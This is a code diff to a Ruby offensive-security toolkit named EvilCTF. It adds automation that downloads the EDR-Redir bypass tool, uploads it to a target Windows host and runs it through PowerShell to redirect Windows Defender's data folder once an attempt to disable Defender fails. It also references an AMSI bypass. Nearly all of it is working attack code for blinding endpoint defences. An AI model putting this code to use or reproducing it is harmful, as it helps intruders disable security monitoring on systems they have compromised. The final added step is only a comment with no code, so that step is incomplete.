@@ -198,6 +198,20 @@ module EvilCTF::Tools
       recommended_remote: 'C:\\Users\\Public\\plink.exe',
       auto_execute: false,
       category: 'pivot'
+    },
+    'edr_redir' => {
+      name: 'EDR-Redir V2',
+      filename: 'EDR-Redir.exe',
+      search_patterns: ['EDR-Redir.exe'],
+      description: 'EDR bypass tool using bind links',
+      url: 'https://github.com/TwoSevenOneT/EDR-Redir',
+      download_url: 'https://github.com/TwoSevenOneT/EDR-Redir/releases/download/V2/EDR-Redir_2.0.zip',
+      backup_urls: [],
+      zip: true,
+      zip_pick_x64: 'EDR-Redir.exe',
+      recommended_remote: 'C:\\Users\\Public\\EDR-Redir.exe',
+      auto_execute: false,
+      category: 'pivot'
     }
   }.freeze
   # AMSI bypass script
@@ -280,7 +294,7 @@ module EvilCTF::Tools
     return
   end
 
-  # Attempt to disable
+  # Attempt to disable using standard method first
   ps_cmd = <<~PS
     try {
       $defender = Get-MpComputerStatus
@@ -302,8 +316,42 @@ module EvilCTF::Tools
   final_status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
   if final_status.output.strip == 'True'
     puts "[!] WARNING: Defender is still enabled after attempted disable."
+    puts "[*] Attempting EDR-Redir V2 bypass..."
+    
+    # Download and stage EDR-Redir
+    edr_redir_path = download_tool('edr_redir')
+    if !edr_redir_path
+      puts "[!] Failed to download EDR-Redir"
+      return false
+    end
+    
+    # Stage EDR-Redir on target system
+    remote_edr_redir = 'C:\\Users\\Public\\EDR-Redir.exe'
+    EvilCTF::Uploader.upload_file(edr_redir_path, remote_edr_redir, shell)
+    
+    # Create temporary directory and run EDR-Redir to redirect Defender
+    ps_cmd = <<~PS
+      try {
+        New-Item -ItemType Directory -Path "C:\\TMP\\TEMPDIR" -Force | Out-Null
+        $result = Start-Process -FilePath "#{remote_edr_redir}" -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
+        if ($result.ExitCode -eq 0) {
+          Write-Output "[+] EDR-Redir V2 executed successfully"
+        } else {
+          Write-Output "[!] EDR-Redir V2 failed with exit code: $($result.ExitCode)"
+        }
+      } catch {
+        Write-Output "[!] Error running EDR-Redir: $($_.Exception.Message)"
+      }
+    PS
+    
+    result = shell.run(ps_cmd)
+    puts result.output
+    
+    # Move tools to the redirected location
+    puts "[*] Moving tools to redirected directory..."
+    
   else
-    puts "[+] Defender successfully disabled"
+    puts "[+] Defender successfully disabled with standard method"
   end
 end  
   
